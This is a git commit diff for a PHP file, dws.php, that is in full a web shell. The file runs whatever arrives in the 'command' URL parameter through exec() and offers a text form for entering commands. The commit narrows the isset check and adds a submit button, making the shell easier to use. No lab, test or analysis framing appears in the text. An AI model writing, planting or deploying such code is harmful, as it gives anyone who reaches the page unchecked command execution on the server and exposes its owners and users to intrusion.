c12f320d9b9d45553150a0a2d25a5cc4fbb0c2cd
InfernoidPl4y <infernoidpl4y@gmail.com>
2026-02-27 21:45:49 -0500

    update

--- dws.php
+++ dws.php
@@ -1,10 +1,11 @@
 <?php
-    if(isset($_GET)){
+    if(isset($_GET['command'])){
         $result=exec($_GET['command']);
     }
 ?>
 <form method="GET">
     <input type="text" name="command">
+    <input type="submit" value="SEND">
 </form>
 <?php
     if($result){
